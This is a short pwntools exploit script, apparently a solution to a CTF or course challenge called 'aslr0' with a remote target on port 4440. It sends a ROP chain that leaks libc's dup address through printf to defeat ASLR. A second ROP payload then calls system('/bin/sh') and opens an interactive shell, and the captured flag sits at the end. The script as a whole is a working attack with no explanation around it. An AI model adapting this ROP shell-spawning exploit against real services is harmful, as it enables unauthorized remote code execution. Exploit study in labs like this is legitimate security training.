#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'aslr0')
libc = ELF('libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('lettieri.iet.unipi.it', 4440)
    else:
        return remote('localhost', 4440)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

nop = 0x000000000040157c
pop_rdi = 0x000000000040157b
pop_rsi_r15 = 0x0000000000401579

io = start()

payload = flat({
    56: [
        pop_rdi,
        exe.got['dup'],
        nop,
        exe.plt['printf'],
        exe.sym['child'],
    ]
})

io.sendline(payload)
io.recvline()
leak = io.recv(8)

log.info(f'{leak=:}')
leak = leak.ljust(8, b'\x00')
leak = u64(leak)
libc.address = leak - libc.sym['dup']
log.info(f'{libc.address=:x}')

ui.pause()

payload = flat({
    56: [
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        libc.sym['system'],
    ]
})

io.sendline(payload)
io.interactive()

"SNH{If you reveal your secrets to the wind, you should not blame the wind for revealing them to the trees.}"